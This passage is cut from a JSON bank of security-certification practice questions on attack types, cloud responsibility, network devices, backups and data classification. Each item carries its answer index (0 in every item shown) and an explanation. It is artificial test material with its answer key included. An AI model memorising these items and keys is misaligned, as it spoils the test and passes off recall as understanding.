this?", "o": ["MAC flooding", "ARP poisoning", "VLAN hopping", "DNS amplification"], "a": 0, "e": "MAC flooding fills the switch's CAM table so it fails open and acts like a hub, exposing traffic. Port security prevents it. Why not the others: ARP poisoning spoofs IP-to-MAC mappings. VLAN hopping crosses VLANs. DNS amplification is a DDoS."}, {"d": 2, "q": "A threat actor's primary goal is to cause service outages at a competitor during its busiest sales season. Which of the following motivations BEST describes this?", "o": ["Disruption / chaos", "Data exfiltration", "Blackmail", "Ethical"], "a": 0, "e": "Aiming to take down services is a disruption motivation. Why not the others: Exfiltration steals data. Blackmail threatens exposure for payment. Ethical hackers are authorized and trying to help."}, {"d": 2, "q": "Which of the following would BEST reduce the risk of a vulnerability in a third-party JavaScript library being exploited in a company's web application?", "o": ["Maintain a software bill of materials and patch dependencies", "Disable JavaScript in all browsers that access the application", "Replace the site's certificate with a self-signed certificate", "Increase password complexity requirements for all users"], "a": 0, "e": "An SBOM tracks which third-party components you use, so you know when one has a vulnerability and can update it. Why not the others: Disabling JavaScript would break the app. Certificates and password rules don't fix library flaws."}, {"d": 2, "q": "An attacker cracks the WPS PIN on a home router to recover the Wi-Fi passphrase. Which of the following mitigations is BEST?", "o": ["Disable WPS", "Hide the SSID", "Enable MAC filtering", "Reduce transmit power"], "a": 0, "e": "The WPS PIN design is weak and can be brute-forced. Turning WPS off removes the vulnerability. Why not the others: Hidden SSIDs and MAC filters are easy to bypass. Lower power shrinks range but doesn't fix WPS."}, {"d": 2, "q": "An employee receives a voice message that sounds exactly like the CEO, instructing them to purchase gift cards. The audio was generated using AI. Which of the following BEST describes this?", "o": ["Impersonation using deepfake audio", "Smishing using a spoofed text message", "Typosquatting with a lookalike domain", "Watering hole on an industry website"], "a": 0, "e": "AI-generated audio mimicking a real executive is impersonation (a deepfake), usually delivered as vishing. Why not the others: Smishing is SMS. Typosquatting is lookalike domains. A watering hole is a compromised website."}, {"d": 2, "q": "A penetration tester finds that a web application's API returns other customers' order details when the order ID in the URL is changed. Which of the following vulnerabilities is this?", "o": ["Broken access control (IDOR)", "Buffer overflow in the API gateway", "Race condition between two API calls", "Reflected cross-site scripting in the URL"], "a": 0, "e": "The app doesn't check whether the user is allowed to see the requested object. That's broken access control (insecure direct object reference). Why not the others: Buffer overflows, race conditions and XSS are different flaw types."}, {"d": 2, "q": "Which of the following is the MOST effective mitigation against a worm exploiting a known operating system vulnerability?", "o": ["Patching", "User awareness training", "Data masking", "Using a SAN certificate"], "a": 0, "e": "Worms exploit unpatched flaws, so patching closes the hole. Why not the others: Worms don't need user action, so training won't stop them. Masking and certificates are unrelated."}, {"d": 2, "q": "An attacker inserts malicious code into an open-source package with a name almost identical to a popular library, hoping developers install it by mistake. Which of the following BEST describes this?", "o": ["Supply chain attack via typosquatted package", "Watering hole on a developer forum", "Zero-day exploit in the package manager", "Pretexting against the development team"], "a": 0, "e": "Publishing lookalike packages to software repositories is a software supply chain attack that uses typosquatting. Why not the others: A watering hole is a website. A zero-day is an unknown flaw. Pretexting is social engineering."}, {"d": 3, "q": "A company uses an IaaS provider to host virtual machines. Under the shared responsibility model, which of the following is the customer responsible for?", "o": ["Patching the guest operating systems", "Physical security of the data center", "Hypervisor maintenance", "Power and cooling"], "a": 0, "e": "In IaaS, the customer manages everything from the OS up: patching, applications, data and access. Why not the others: Physical security, the hypervisor, and power and cooling are the provider's responsibility."}, {"d": 3, "q": "A company uses a SaaS email platform. Which of the following remains the company's responsibility?", "o": ["Managing user accounts and data access", "Patching the provider's email servers", "Maintaining the application's code", "Securing the provider's physical servers"], "a": 0, "e": "In SaaS, the provider runs nearly everything, but the customer still owns its data and who can access it. Why not the others: Server patching, code maintenance and physical security belong to the SaaS provider."}, {"d": 3, "q": "A DevOps team defines servers, networks, and firewall rules in version-controlled configuration files that are automatically deployed. Which of the following is this?", "o": ["Infrastructure as code", "Serverless computing", "Software-defined WAN", "Containerization"], "a": 0, "e": "Infrastructure as code (IaC) defines infrastructure in files, so deployments are repeatable and easy to audit. Why not the others: Serverless runs functions without managing servers. SD-WAN manages WAN links. Containers package applications."}, {"d": 3, "q": "A developer runs code as event-triggered functions where the cloud provider manages all underlying servers. Which of the following architectures is this?", "o": ["Serverless", "IaaS", "On-premises", "Air-gapped"], "a": 0, "e": "Serverless (function as a service) runs code on demand while the provider manages the servers. Why not the others: IaaS means you manage VMs. On-premises is your own hardware. Air-gapped means physically isolated."}, {"d": 3, "q": "An application is built as many small, independent services that communicate through APIs, so each can be updated separately. Which of the following architectures is this?", "o": ["Microservices", "Monolithic", "Mainframe", "Peer-to-peer"], "a": 0, "e": "Microservices split an app into small services that can be deployed independently. Why not the others: A monolith is one large codebase deployed as a unit. Mainframe and peer-to-peer are different models."}, {"d": 3, "q": "A network separates the control plane from the data plane so that routing decisions are made by a centralized controller. Which of the following is this?", "o": ["Software-defined networking", "Air-gapped network", "Screened subnet (DMZ)", "Virtual private network"], "a": 0, "e": "SDN separates the control plane (decisions) from the data plane (forwarding) and centralizes control. Why not the others: Air gaps isolate. A screened subnet is a DMZ. A VPN is an encrypted tunnel."}, {"d": 3, "q": "A classified system is physically isolated with no network connection to the internet or any other network. Which of the following BEST describes it?", "o": ["Air-gapped", "Segmented with VLANs", "Behind a screened subnet", "Cloud-hosted"], "a": 0, "e": "An air gap means no physical or logical connection to other networks. Why not the others: VLANs and screened subnets are logical separation on connected networks. Cloud hosting is internet-reachable."}, {"d": 3, "q": "Which of the following is a security concern specific to industrial control systems (ICS) and SCADA?", "o": ["Legacy systems often can't be patched without downtime", "They can never be connected to a network", "They always encrypt all control traffic by default", "They put confidentiality above availability and safety"], "a": 0, "e": "ICS/SCADA usually runs for years, puts availability first, and often can't be patched without downtime. Why not the others: Many ICS are networked. Many lack encryption. Availability is usually their top priority."}, {"d": 3, "q": "Which of the following BEST describes a real-time operating system (RTOS)?", "o": ["An OS that must meet strict timing deadlines", "A desktop OS with real-time antivirus", "A cloud OS that scales automatically", "An OS used only on virtualization hosts"], "a": 0, "e": "An RTOS guarantees deterministic response times. It's used in vehicles, medical devices and industrial equipment. Why not the others: The other options describe unrelated OS features."}, {"d": 3, "q": "A company deploys hundreds of IoT sensors in a warehouse. Which of the following is the MOST significant security concern?", "o": ["Weak default credentials and limited ability to patch", "Excessive processing power that attackers can use for mining", "Too much built-in encryption slowing the network", "Overly complex user interfaces that confuse staff"], "a": 0, "e": "IoT devices often ship with default passwords and rarely get updates. Why not the others: IoT devices are low-power and usually short on security features, not over-equipped with them."}, {"d": 3, "q": "Which of the following is a security benefit of containerization?", "o": ["Apps are isolated and packaged with only their dependencies", "Each container runs its own separate OS kernel", "Containers remove the need to patch base images", "Containers can't be compromised because they're immutable"], "a": 0, "e": "Containers isolate applications and package only what each needs, which shrinks the attack surface. Why not the others: Containers share the host kernel (VMs have their own). Container images still need patching. Containers can be compromised."}, {"d": 3, "q": "A firewall is configured so that if it fails, all traffic is blocked. Which of the following BEST describes this configuration?", "o": ["Fail-closed", "Fail-open", "Active/passive", "Load balanced"], "a": 0, "e": "Fail-closed (fail-secure) blocks traffic when the device fails, choosing security over availability. Why not the others: Fail-open lets traffic through on failure. Active/passive and load balancing describe redundancy."}, {"d": 3, "q": "An IPS is installed so all traffic passes through it and it can block malicious packets in real time. Which of the following placements is this?", "o": ["Inline", "Tap/monitor", "Passive", "Out-of-band"], "a": 0, "e": "Inline devices sit in the traffic path and can actively block. Why not the others: Tap/monitor, passive and out-of-band placements see a copy of the traffic and can only alert."}, {"d": 3, "q": "A company wants to host a public web server while protecting its internal network. Where should the web server be placed?", "o": ["In a screened subnet (DMZ)", "On the internal LAN", "On the same VLAN as the database servers", "Directly on the internet with no firewall"], "a": 0, "e": "A screened subnet sits between the internet and the internal network, so public servers are reachable while internal systems stay protected. Why not the others: Putting a public server on the LAN or the database VLAN exposes internal systems. No firewall leaves the server unprotected."}, {"d": 3, "q": "Administrators must connect to a hardened server first before they can manage systems in a secure network zone. Which of the following is this server?", "o": ["Jump server", "Proxy server", "Load balancer", "Honeypot"], "a": 0, "e": "A jump server (jump box) is a hardened, monitored gateway for administrative access into a secure zone. Why not the others: A proxy forwards user requests. A load balancer spreads traffic. A honeypot is a decoy."}, {"d": 3, "q": "A company wants a single device that combines firewall, IPS, antivirus, content filtering, and VPN for a small branch office. Which of the following should it purchase?", "o": ["Unified threat management (UTM)", "Layer 2 managed switch", "Web application firewall only", "Hardware security module (HSM)"], "a": 0, "e": "A UTM bundles several security functions into one appliance, which suits small offices. Why not the others: A switch forwards frames. A WAF only protects web apps. An HSM stores keys."}, {"d": 3, "q": "Which of the following devices is specifically designed to protect web applications from attacks such as SQL injection and cross-site scripting?", "o": ["Web application firewall (WAF)", "Stateful Layer 4 firewall", "Network load balancer", "NetFlow collector"], "a": 0, "e": "A WAF inspects HTTP traffic at Layer 7 for web attacks like SQLi and XSS. Why not the others: Layer 4 firewalls filter by IP and port only. Load balancers spread traffic. NetFlow collects traffic statistics."}, {"d": 3, "q": "A firewall that can identify and control traffic based on the specific application (for example, allowing Teams but blocking games) regardless of port is BEST described as which of the following?", "o": ["Next-generation firewall (NGFW)", "Stateless packet filter", "Stateful Layer 4 firewall", "Proxy ARP gateway"], "a": 0, "e": "NGFWs inspect at the application layer and can identify apps no matter which port they use. Why not the others: Packet filters and Layer 4 firewalls see only IPs, ports and protocols. Proxy ARP is a routing feature."}, {"d": 3, "q": "A company requires every device to authenticate before it is granted access to a switch port. Which of the following should be implemented?", "o": ["802.1X", "Spanning Tree Protocol", "Port mirroring", "DHCP snooping"], "a": 0, "e": "802.1X provides port-based network access control, usually with a RADIUS server. Why not the others: STP prevents loops. Port mirroring copies traffic. DHCP snooping blocks rogue DHCP servers."}, {"d": 3, "q": "Which of the following VPN protocols operates at Layer 3 and uses Authentication Header (AH) and Encapsulating Security Payload (ESP)?", "o": ["IPSec", "TLS", "SSH", "L2TP without encryption"], "a": 0, "e": "IPSec works at the network layer and uses AH (integrity and authentication) and ESP (encryption and integrity). Why not the others: TLS works above the transport layer. SSH is for secure remote shells. L2TP has no encryption on its own and is usually paired with IPSec."}, {"d": 3, "q": "In IPSec, which mode encrypts the entire original IP packet, including headers, and is commonly used for site-to-site VPNs?", "o": ["Tunnel mode", "Transport mode", "Aggressive mode", "Main mode"], "a": 0, "e": "Tunnel mode wraps and encrypts the whole original packet. It's the usual choice between gateways. Why not the others: Transport mode encrypts only the payload. Main and aggressive modes are IKE phase 1 negotiation modes."}, {"d": 3, "q": "A company with many branch offices wants to intelligently route traffic over multiple internet connections and cloud services from a centralized controller. Which of the following should it implement?", "o": ["SD-WAN", "Air-gapped network", "Screened subnet", "Jump server"], "a": 0, "e": "SD-WAN manages multiple WAN links from one controller and routes traffic by policy. Why not the others: An air gap isolates. A DMZ hosts public servers. A jump server is for admin access."}, {"d": 3, "q": "Which of the following combines networking and security functions such as secure web gateway, CASB, and zero trust network access into a cloud-delivered service?", "o": ["Secure access service edge (SASE)", "Unified threat management on-premises", "Network address translation", "Spanning tree"], "a": 0, "e": "SASE delivers networking (like SD-WAN) and security (SWG, CASB, ZTNA, FWaaS) from the cloud, close to users. Why not the others: UTM is an on-site box. NAT translates addresses. Spanning tree prevents loops."}, {"d": 3, "q": "A load balancer distributes traffic across two web servers, and both servers handle requests at the same time. Which of the following configurations is this?", "o": ["Active/active", "Active/passive", "Cold standby", "Fail-closed"], "a": 0, "e": "In active/active, every node handles traffic at once. Why not the others: In active/passive, one waits as a standby. Cold standby isn't running at all. Fail-closed describes failure behavior."}, {"d": 3, "q": "Which of the following data states describes information currently being processed in a system's RAM?", "o": ["Data in use", "Data at rest", "Data in transit", "Data sovereignty"], "a": 0, "e": "Data being processed in memory or the CPU is in use. Why not the others: At rest is stored on disk. In transit is moving across a network. Sovereignty is about which laws apply."}, {"d": 3, "q": "A company must ensure that its EU customers' personal data is stored only on servers within the European Union. Which of the following concepts does this address?", "o": ["Data sovereignty", "Data masking", "Data in use", "Tokenization"], "a": 0, "e": "Data sovereignty means data is subject to the laws of the country where it's stored, which drives data localization requirements. Why not the others: Masking hides values. Data in use is a state. Tokenization replaces values."}, {"d": 3, "q": "A company labels its quarterly earnings report before public release so that only executives can access it, because disclosure would seriously harm the company. Which classification is MOST appropriate?", "o": ["Confidential", "Public", "Unclassified", "Open"], "a": 0, "e": "Information whose disclosure would cause serious harm and that is limited to a few people is confidential (or restricted) in commercial schemes. Why not the others: Public, unclassified and open data can be freely shared."}, {"d": 3, "q": "Which of the following data types includes a customer's name combined with their Social Security number?", "o": ["PII", "Intellectual property", "Public data", "Trade secret"], "a": 0, "e": "PII is information that can identify a person. A name plus SSN is a textbook example. Why not the others: Intellectual property and trade secrets are company creations. Public data isn't sensitive."}, {"d": 3, "q": "A hospital stores patient diagnoses and treatment records. Which of the following data types is this?", "o": ["PHI", "Financial data", "Intellectual property", "Public data"], "a": 0, "e": "Health records tied to a person are PHI, regulated in the U.S. by HIPAA. Why not the others: Financial data covers accounts and cards. IP is company creations. Public data isn't sensitive."}, {"d": 3, "q": "A company's secret recipe for its flagship product is BEST categorized as which of the following?", "o": ["Trade secret", "PII", "PHI", "Regulated financial data"], "a": 0, "e": "A trade secret is confidential business information that gives a competitive edge, like a recipe or formula. Why not the others: PII and PHI are about people. Financial data is about accounts and transactions."}, {"d": 3, "q": "Which of the following restricts access to data based on the physical location of the user's device?", "o": ["Geolocation", "Masking", "Segmentation", "Hashing"], "a": 0, "e": "Geolocation controls (geofencing) allow or block access based on where the device is. Why not the others: Masking hides values. Segmentation separates networks. Hashing makes digests."}, {"d": 3, "q": "A company wants a disaster recovery site with power, network, and fully configured equipment that can take over operations within minutes. Which type of site is this?", "o": ["Hot site", "Warm site", "Cold site", "Mobile site with no equipment"], "a": 0, "e": "A hot site is fully equipped, has current data and is ready almost immediately. It's also the most expensive. Why not the others: A warm site has hardware but needs data and configuration (hours to days). A cold site is just space and power (days to weeks)."}, {"d": 3, "q": "A company has a recovery facility with power and HVAC but no computers or network equipment installed. Which type of site is this?", "o": ["Cold site", "Warm site", "Hot site", "Geographically dispersed active site"], "a": 0, "e": "A cold site gives you the space and basic utilities, but you bring and set up everything else. It's cheapest and slowest. Why not the others: Warm sites have some hardware. Hot sites are fully ready. An active dispersed site is already running."}, {"d": 3, "q": "A company's primary and backup data centers are in the same city. A regional flood takes down both. Which of the following would have prevented this outage?", "o": ["Geographic dispersion", "Clustering", "More frequent backups", "Load balancing within the primary site"], "a": 0, "e": "Putting sites far enough apart means one regional disaster can't take out both. Why not the others: Clustering and load balancing help within a site. Backups help recovery but don't keep you running."}, {"d": 3, "q": "A company runs its application across two different cloud providers so a single provider's outage does not take it offline. Which of the following concepts is this?", "o": ["Multi-cloud", "Platform diversity on a single host", "Cold site", "Air gap"], "a": 0, "e": "Using several cloud providers avoids depending on one vendor. Why not the others: Platform diversity means varied OSs or technologies. A cold site is an empty facility. An air gap is isolation."}, {"d": 3, "q": "Which of the following provides short-term power during an outage, long enough for systems to shut down gracefully or for a generator to start?", "o": ["UPS", "Generator", "PDU", "Surge protector"], "a": 0, "e": "A UPS's batteries cover the gap during an outage. Why not the others: A generator provides long-term power but takes time to start. A PDU distributes power. A surge protector handles spikes, not outages."}, {"d": 3, "q": "A team meets in a conference room and talks through how each department would respond to a simulated ransomware attack, without touching any systems. Which of the following is this?", "o": ["Tabletop exercise", "Failover test", "Parallel processing test", "Full interruption test"], "a": 0, "e": "A tabletop exercise is a discussion-based walkthrough of a scenario. Why not the others: Failover and full interruption tests actually switch systems. Parallel processing runs the backup systems alongside production."}, {"d": 3, "q": "A company runs its recovery systems at the same time as production systems to verify they produce the same results, without stopping production. Which of the following tests is this?", "o": ["Parallel processing", "Tabletop", "Full interruption", "Simulation with no systems involved"], "a": 0, "e": "Parallel processing runs backup and primary systems side by side to compare results without disrupting production. Why not the others: A tabletop is discussion only. Full interruption shuts down production. A simulation without systems doesn't verify their output."}, {"d": 3, "q": "Which backup type copies all files changed since the last full backup and does NOT reset the archive bit?", "o": ["Differential", "Incremental", "Full", "Snapshot"], "a": 0, "e": "Differential backups grow each day until the next full backup, and restoring needs only the full plus the latest differential. Why not the others: Incremental backups copy changes since the last backup of any kind and reset the bit. Full backups copy everything. Snapshots capture a point in time."}, {"d": 3, "q": "A company performs a full backup on Sunday and incremental backups every other day. The server fails on Thursday. Which backups are needed to restore?", "o": ["Sunday's full plus Monday, Tuesday, and Wednesday incrementals", "Only Sunday's full backup", "Sunday's full plus Wednesday's incremental only", "Only Wednesday's incremental backup"], "a": 0, "e": "Each incremental holds only the changes since the previous backup, so you need the full backup and every incremental after it, in order. Why not the others: The full alone loses three days. Wednesday's incremental alone (with or without the full) misses Monday's and Tuesday's changes."}, {"d": 3, "q": "A virtualization administrator captures the exact state of a VM before applying a risky update so it can be rolled back in seconds. Which of the following is this?", "o": ["Snapshot", "Differential backup", "Journaling", "Replication to a cold site"], "a": 0, "e": "A snapshot captures a VM's state at a point in time for quick rollback. Why not the others: A differential is a file backup type. Journaling records changes. A cold site has no running systems."}, {"d": 3, "q": "Database changes are continuously copied to a server at another site so it always has a near-current copy. Which of the following is this?", "o": ["Replication", "Cold backup", "Tape rotation", "Snapshot"], "a": 0, "e": "Replication copies data continuously, or nearly so, to another system or site. Why not the others: Cold backups and tape run at intervals. A snapshot is a single point in time."}, {"d": 3, "q": "Which of the following groups multiple servers so that if one fails, another automatically takes over the same service?", "o": ["Clustering", "Port mirroring", "Tokenization", "Air gapping"], "a": 0, "e": "A cluster provides high availability through automatic failover between nodes. Why not the others: Port mirroring copies traffic. Tokenization protects data. Air gapping isolates systems."}, {"d": 3, "q": "A business ensures it has enough staff, technology, and infrastructure to handle a projected 40% growth in customers next year. Which of the following is this?", "o": ["Capacity planning", "Tabletop exercise", "Risk transfer", "Change management"], "a": 0, "e": "Capacity planning makes sure people, technology and infrastructure can meet future demand. Why not the others: A tabletop tests responses. Risk transfer shifts risk. Change management controls changes."}, {"d": 3, "q": "Which of the following documents describes how an organization will keep performing essential functions during and after a major disruption?", "o": ["Continuity of operations plan", "Acceptable use policy", "Service level agreement", "Network topology diagram"], "a": 0, "e": "A COOP keeps essential functions running through a disruption. Why not the others: An AUP covers user behavior. An SLA is a service commitment. A network diagram shows topology."}, {"d": 3, "q": "A company's wireless network uses WPA3-Enterprise. Which of the following does it use to authenticate users?", "o": ["802.1X with a RADIUS server", "A single pre-shared key", "WPS PIN", "MAC address filtering only"], "a": 0, "e": "Enterprise mode authenticates each user through 802.1X/EAP against a RADIUS server. Why not the others: A pre-shared key is Personal mode. WPS is insecure. MAC filtering isn't real authentication."}, {"d": 3, "q": "Which of the following WPA3 features replaces the WPA2 four-way handshake with a more secure key exchange that resists offline dictionary attacks?", "o": ["Simultaneous Authentication of Equals (SAE)", "Temporal Key Integrity Protocol (TKIP)", "Wired Equivalent Privacy (WEP)", "EAP-MD5 challenge handshake"], "a": 0, "e": "SAE (Dragonfly) is WPA3-Personal's key exchange, and it resists offline cracking. Why not the others: TKIP and WEP are old and weak. EAP-MD5 is a weak EAP method."}, {"d": 3, "q": "Which of the following is the PRIMARY reason to place a forward proxy between internal users and the internet?", "o": ["To filter and log users' outbound web requests", "To balance incoming traffic across web servers", "To provide 802.1X wireless authentication", "To store and protect encryption keys"], "a": 0, "e": "A forward proxy makes requests for internal clients, so it can filter, cache and log web traffic. Why not the others: Balancing inbound traffic is a reverse proxy or load balancer. Wireless authentication is 802.1X/RADIUS. Key storage is an HSM."}, {"d": 3, "q": "An IDS receives a copy of traffic through a switch SPAN port. Which of the following is TRUE about this deployment?", "o": ["It can detect but cannot directly block traffic", "It can block traffic inline", "It will cause an outage if it fails", "It decrypts all TLS traffic automatically"], "a": 0, "e": "A passive sensor on a SPAN port sees copies of packets. It can alert, but it can't drop traffic. Why not the others: Blocking needs inline placement. A passive sensor failing doesn't interrupt traffic. It doesn't decrypt TLS on its own."}, {"d": 3, "q": "Which of the following BEST describes the attack surface of a system?", "o": ["Every point where an attacker could get in or out", "The physical floor space of the data center", "The number of privileged administrators", "The total storage capacity of all systems"], "a": 0, "e": "The attack surface is every exposed entry point: ports, services, apps, users and interfaces. Hardening shrinks it. Why not the others: Building size, admin count and storage don't describe exposure."}, {"d": 3, "q": "Which of the following is a disadvantage of a centralized architecture compared to a decentralized one?", "o": ["It can create a single point of failure", "It is harder to manage policies consistently", "It always costs more to operate", "It cannot be monitored"], "a": 0, "e": "With central control, losing the central component can take everything down. Why not the others: Centralizing usually makes policies easier to manage. Cost varies. Central systems are easier to monitor, not harder."}, {"d": 3, "q": "A security team groups servers into zones such as user, server, and management, and only allows required traffic between zones. Which of the following concepts is this?", "o": ["Security zones", "Air gapping", "Clustering", "Tokenization"], "a": 0, "e": "Security zones group assets by trust level and control traffic between them. Why not the others: Air gaps fully isolate. Clustering provides availability. Tokenization protects data values."}, {"d": 3, "q": "A company encrypts data stored on laptops so it is protected if a laptop is stolen. Which of the following data states is being protected?", "o": ["Data at rest", "Data in transit", "Data in use", "Data in motion between APIs"], "a": 0, "e": "Stored data on disks and drives is at rest, and full-disk encryption protects it. Why not the others: Transit and motion refer to network transfer. In use is data in memory."}, {"d": 3, "q": "An organization uses TLS for all connections between its web servers and database. Which of the following data states does this protect?", "o": ["Data in transit", "Data at rest", "Data in use", "Data sovereignty"], "a": 0, "e": "TLS encrypts data as it moves across the network. Why not the others: At rest is on disk. In use is in memory. Sovereignty is about legal jurisdiction."}, {"d": 3, "q": "Which of the following BEST describes the benefit of platform diversity in resilient design?", "o": ["A vulnerability in one platform will not affect every system", "It reduces licensing costs by consolidating vendors", "It simplifies patch management across the environment", "It removes the need for separate backups"], "a": 0, "e": "Running different OSs or vendors means one flaw doesn't hit everything (defense in depth). Why not the others: Diversity usually costs more and makes patching harder, and you still need backups."}, {"d": 3, "q": "A cloud architect is concerned that the cloud provider's API is the single way to manage resources. Which of the following BEST describes this concern for a cloud environment?", "o": ["Single point of failure and vendor dependency", "Exposure of data in use on the provider's hosts", "Violation of an air-gapped network design", "Physical tailgating into the provider's facility"], "a": 0, "e": "Depending entirely on one provider's management plane creates both a single point of failure and vendor lock-in. Why not the others: The other options don't describe dependence on one management interface."}, {"d": 3, "q": "Which of the following protocols should replace Telnet for secure remote command-line management of network devices?", "o": ["SSH", "FTP", "HTTP", "SNMPv1"], "a": 0, "e": "SSH (TCP 22) encrypts remote shell sessions, while Telnet sends everything in cleartext. Why not the others: FTP transfers files in cleartext. HTTP is unencrypted web. SNMPv1 uses cleartext community strings."}, {"d": 3, "q": "Which of the following should be used to provide confidentiality for SNMP traffic used to monitor network devices?", "o": ["SNMPv3", "SNMPv2c", "SNMPv1", "Syslog over UDP"], "a": 0, "e": "SNMPv3 adds authentication and encryption. Why not the others: v1 and v2c send community strings in cleartext. Syslog is logging, not SNMP."}, {"d": 3, "q": "Which of the following protocols provides secure file transfer using SSH?", "o": ["SFTP", "FTP", "TFTP", "FTPS over port 21 without TLS"], "a": 0, "e": "SFTP runs file transfers over SSH (port 22). Why not the others: FTP and TFTP are unencrypted. FTPS without TLS is just FTP."}, {"d": 3, "q": "Which of the following provides secure directory lookups by encrypting LDAP traffic?", "o": ["LDAPS", "LDAP on port 389 without TLS", "SMTP", "RDP"], "a": 0, "e": "LDAPS (LDAP over TLS, port 636) encrypts directory queries. Why not the others: Plain LDAP on 389 is unencrypted. SMTP is email. RDP is remote desktop."}, {"d": 3, "q": "A company wants to make sure that a compromise of its cloud provider account does not delete its backups. Which of the following is the BEST approach?", "o": ["Keep immutable or offline backups outside production", "Store backups in the same cloud account", "Back up more often to the same location", "Rely on snapshots on the same VMs"], "a": 0, "e": "Immutable, offline or separate-account backups can't be deleted by an attacker who controls production. Why not the others: Same-account backups and same-VM snapshots are exposed to the same compromise. Backing up more often doesn't protect the backups."}, {"d": 3, "q": "Which of the following describes the security implication of using an embedded system with a long product life and no update mechanism?", "o": ["Vulnerabilities discovered later may never be fixed", "It will automatically receive cloud patches", "It cannot be attacked over any network", "It must be rebooted daily to stay secure"], "a": 0, "e": "With no way to update, any flaw found later stays permanently, so compensating controls like segmentation are needed. Why not the others: There are no automatic patches. Embedded systems can still be networked. Reboots are unrelated."}, {"d": 4, "q": "A company deploys a standard, approved configuration to all new workstations and regularly checks for drift from it. Which of the following is this?", "o": ["Secure baseline", "Sandbox", "Honeynet", "Risk register"], "a": 0, "e": "A secure baseline is the approved standard configuration. You establish it, deploy it and keep checking systems against it. Why not the others: A sandbox isolates code. A honeynet is a decoy network. A risk register tracks risks."}, {"d": 4, "q": "A company wants to remotely enforce screen locks, push apps, and wipe lost phones used by employees. Which of the following should it implement?", "o": ["Mobile device management", "Network access control", "Data loss prevention", "Security information and event management"], "a": 0, "e": "MDM centrally manages mobile devices: policies, apps and remote wipe. Why not the others: NAC controls network admission. DLP stops data leaks. A SIEM correlates logs."}, {"d": 4, "q": "Employees use their personally owned phones for work email, and the company manages only a work container on each device. Which deployment model is this?", "o": ["BYOD", "COPE", "CYOD", "Corporate-owned, business only"], "a": 0, "e": "Bring your own device means employees own the device, and the company manages work data, often in a container. Why not the others: COPE is corporate-owned, personally enabled. CYOD means picking from company-approved devices the company owns. Business-only is corporate-owned with no personal use."}, {"d": 4, "q": "A company buys phones for employees and allows them to use the phones for personal purposes as well. Which deployment model is this?", "o": ["COPE", "BYOD", "CYOD", "VDI"], "a": 0, "e": "COPE (corporate-owned, personally enabled) means the company owns the device and allows personal use. Why not the others: BYOD is employee-owned. CYOD lets employees choose from an approved list. VDI is virtual desktops."}, {"d": 4, "q": "Before deploying a wireless network in a new office, a technician walks the building measuring signal strength and interference to plan AP placement. Which of the following is this?", "o": ["Site survey", "Penetration test", "War driving by an attacker", "Packet capture"], "a": 0, "e": "A wireless site survey maps coverage and interference, usually producing a heat map, to plan where APs go. Why not the others: A pen test simulates attacks. War driving is attackers mapping Wi-Fi. A packet capture records traffic."}, {"d": 4, "q": "Which of the following application security techniques ensures user-supplied data matches expected types and formats before processing?", "o": ["Input validation", "Code signing", "Sandboxing", "Secure cookies"], "a": 0, "e": "Input validation checks data against allowed formats, which blocks injection attacks. Why not the others: Code signing proves who wrote the code. Sandboxing isolates execution. Secure cookies protect session tokens."}, {"d": 4, "q": "A web application sets the Secure and HttpOnly flags on its session cookies. What is the benefit of the HttpOnly flag?", "o": ["It stops client-side scripts from reading the cookie", "It forces the cookie to be sent only over HTTPS", "It encrypts the cookie's contents in storage", "It prevents the cookie from ever expiring"], "a": 0, "e": "HttpOnly blocks JavaScript from reading the cookie, which limits XSS session theft. Why not the others: The Secure flag forces HTTPS. Neither flag encrypts the cookie or changes when it expires."}, {"d": 4, "q": "A developer uses a tool that analyzes source code for vulnerabilities without running the application. Which of the following is this?", "o": ["Static code analysis", "Dynamic analysis", "Fuzzing", "Penetration testing"], "a": 0, "e": "Static analysis (SAST) examines code without running it. Why not the others: Dynamic analysis (DAST) and fuzzing test the running app
